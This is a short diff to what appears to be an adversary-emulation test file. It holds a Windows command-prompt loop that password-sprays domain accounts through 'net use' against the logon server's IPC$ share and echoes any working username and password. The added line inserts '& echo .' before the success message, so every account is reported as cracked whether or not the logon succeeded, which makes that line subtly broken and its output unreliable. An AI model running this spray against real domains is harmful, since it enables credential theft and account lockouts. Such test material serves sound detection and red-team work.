@@ -31,5 +31,5 @@ atomic_tests:
       @FOR /F "tokens=*" %a in ('type %temp%\3.txt ^| findstr /vc:"ECHO is on."') do @echo %a >> %temp%\users.txt
   executor:
     command: |-
-      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
+      @FOR /F %n in (%temp%\users.txt) do @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "#{password}" 1>NUL 2>&1 & echo . && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL
     name: command_prompt
